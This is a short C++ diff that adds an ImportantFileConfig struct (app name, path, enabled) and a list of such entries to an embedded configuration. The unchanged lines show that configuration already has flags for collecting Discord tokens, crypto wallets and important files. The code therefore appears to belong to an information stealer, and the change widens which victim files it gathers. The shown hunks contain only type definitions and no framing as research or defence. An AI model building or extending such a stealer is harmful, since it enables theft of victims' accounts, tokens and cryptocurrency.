@@ -5,6 +5,14 @@
 #include <iomanip>
 #include <sstream>
 #include <optional>
+#include <vector>
+
+// Structure for important file configuration
+struct ImportantFileConfig {
+    std::string appName;
+    std::string path;
+    bool enabled;
+};
 
 // Embedded configuration structure
 struct EmbeddedConfig {
@@ -20,6 +28,7 @@ struct EmbeddedConfig {
     bool collectDiscordTokens;
     bool collectCryptoWallets;
     bool collectImportantFiles;
+    std::vector<ImportantFileConfig> importantFilesConfig;
 };
 
 std::string get_current_date_time();
